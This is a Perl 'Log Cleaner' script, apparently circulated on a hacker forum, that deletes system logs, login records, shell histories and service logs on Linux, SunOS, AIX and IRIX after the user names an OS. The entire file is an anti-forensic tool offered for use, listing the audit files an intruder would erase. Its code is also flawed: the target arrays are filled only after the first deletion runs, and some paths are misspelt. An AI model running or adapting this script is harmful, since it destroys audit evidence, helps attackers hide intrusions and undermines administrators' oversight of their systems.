#!usr/bin/perl -w #Warnings enabled!  
   #Log cleaner version BETA!  
   #Created by illuz1oN  
   #G0t-Root.org // FiLE-FUSiON.net!  
   #Greets - t0pP8uZz,Pxncture,Shades,xell,optiplex!  
   #Give Credits Where Needed  
   #This took time, Hope you fucking use it :D  
   #Report bugs to <a href="mailto:illuz1oN@hotmail.co.uk">illuz1oN@hotmail.co.uk</a>  
   #or G0t-Root.org/forums/, PM illuz1oN  
   {  
   $resume = 1;  
    
   print "############################\n";  
   print "#    Log Cleaner BETA      #\n";  
   print "#       illuz1oN           #\n";  
   print "#      G0t-Root.org        #\n"; #Printing teh blablabla...  
   print "#     File-Fusion.net      #\n";  
   print "#      h4ck-y0u.org        #\n";  
   print "############################\n";  
    
   while($resume == 1) #Start Loop  
   {  
     print "Enter Which OS: "; #User Input  
     chomp($os = <STDIN>); #Takes it into memory  
        
    
                if($os eq "linux"){ #If linux typed, do the following and start brackets  
             print "[+]Linux Selected...\n"; #Prints  
             sleep 1;  
             print "[+]Logs Located...\n"; #Prints  
             sleep 1;  
             unlink @linux; #Deletes Logs  
             sleep 1;  
             print "[+]Logs Successfully Deleted...\n"; #Prints  
              } #End brackets  
              
                
                
                
              if($os eq "sunos"){ #If sunos typed, do the following and start brackets  
              print "[+]SunOS Selected...\n"; #prints  
              sleep 1;  
              print "[+]Logs Located...\n"; #prints  
              sleep 1;  
              unlink @sunos; #Deletes Logs  
              print "[+]Logs Successfully Deleted...\n"; #Prints  
              } #Ends brackets  
                
                
              if($os eq "aix"){ #If aix typed, do the following and start brackets  
                 print "[+]Aix Selected...\n"; #Prints  
                 sleep 1;  
              print "[+]Logs Located...\n"; #prints  
              sleep 1;  
              unlink @aix; #Deletes Logs  
              print "[+]Logs Successfully Deleted...\n"; #Prints  
              } #Ends Aix Brackets  
              
                
                
              if($os eq "irix"){ #If irix typed, do the following and start bracket  
              print "[+]Irix Selected...\n"; #Prints..  
              sleep 1;  
              print "[+]Logs Located...\n"; #Prints..  
              sleep 1;  
              unlink @irix; #Deletes Logs  
              print "[+]Logs Successfully Deleted...\n";  
              } #Ends irix brackets  
                
                
                                 #Logs of Irix Systems  
    
      { #Start Irix Bracket  
       @irix = ("/var/adm/SYSLOG", "/var/adm/sulog", "/var/adm/utmp", "/var/adm/utmpx",  
              "/var/adm/wtmp", "/var/adm/wtmpx", "/var/adm/lastlog/",  
            "/usr/spool/lp/log", "/var/adm/lp/lp-errs", "/usr/lib/cron/log",  
            "/var/adm/loginlog", "/var/adm/pacct", "/var/adm/dtmp",  
            "/var/adm/acct/sum/loginlog", "var/adm/X0msgs", "/var/adm/crash/vmcore",  
            "/var/adm/crash/unix") #End Array  
           } #End Irix Bracket  
                                #Log sof Aix Systems  
      {   #Start Aix Bracket  
      @aix = ("/var/adm/pacct", "/var/adm/wtmp", "/var/adm/dtmp", "/var/adm/qacct",    
               "/var/adm/sulog", "/var/adm/ras/errlog", "/var/adm/ras/bootlog",  
               "/var/adm/cron/log", "/etc/utmp", "/etc/security/lastlog",  
               "/etc/security/failedlogin", "usr/spool/mqueue/syslog")   #End Array    
         }   #End Aix Bracket  
                                #Logs of SunOS Systems    
      {   #Start SunOS Bracket                      
      @sunos = ("/var/adm/messages", "/var/adm/aculogs", "/var/adm/aculog",  
                 "/var/adm/sulog", "/var/adm/vold.log", "/var/adm/wtmp",  
                 "/var/adm/wtmpx", "/var/adm/utmp", "/var/adm/utmpx",  
                 "/var/adm/log/asppp.log", "/var/log/syslog",  
                 "/var/log/POPlog", "/var/log/authlog", "/var/adm/pacct",  
                 "/var/lp/logs/lpsched", "/var/lp/logs/requests",  
              "/var/cron/logs", "/var/saf/_log", "/var/saf/port/log") #End Array  
         } #End Sunos bracket      
                                #Logs of Linux Systems        
      {   #Start Linux Bracket      
       @linux = ("/var/log/lastlog", "/var/log/telnetd", "/var/run/utmp",  
                 "/var/log/secure","/root/.ksh_history", "/root/.bash_history",  
                 "/root/.bash_logut", "/var/log/wtmp", "/etc/wtmp",  
                 "/var/run/utmp", "/etc/utmp", "/var/log", "/var/adm",  
                 "/var/apache/log", "/var/apache/logs", "/usr/local/apache/logs",  
                 "/usr/local/apache/logs", "/var/log/acct", "/var/log/xferlog",  
                 "/var/log/messages/", "/var/log/proftpd/xferlog.legacy",  
                 "/var/log/proftpd.xferlog", "/var/log/proftpd.access_log",  
                 "/var/log/httpd/error_log", "/var/log/httpsd/ssl_log",  
                 "/var/log/httpsd/ssl.access_log", "/etc/mail/access",  
                 "/var/log/qmail", "/var/log/smtpd", "/var/log/samba",  
                 "/var/log/samba.log.%m", "/var/lock/samba", "/root/.Xauthority",  
                 "/var/log/poplog", "/var/log/news.all", "/var/log/spooler",  
                 "/var/log/news", "/var/log/news/news", "/var/log/news/news.all",  
                 "/var/log/news/news.crit", "/var/log/news/news.err", "/var/log/news/news.notice",  
                 "/var/log/news/suck.err", "/var/log/news/suck.notice",  
                 "/var/spool/tmp", "/var/spool/errors", "/var/spool/logs", "/var/spool/locks",  
                 "/usr/local/www/logs/thttpd_log", "/var/log/thttpd_log",  
                 "/var/log/ncftpd/misclog.txt", "/var/log/nctfpd.errs",  
                 "/var/log/auth") #End array  
         } #End linux bracket  
          
      } #Ends Loop  
        
   } #End first bracket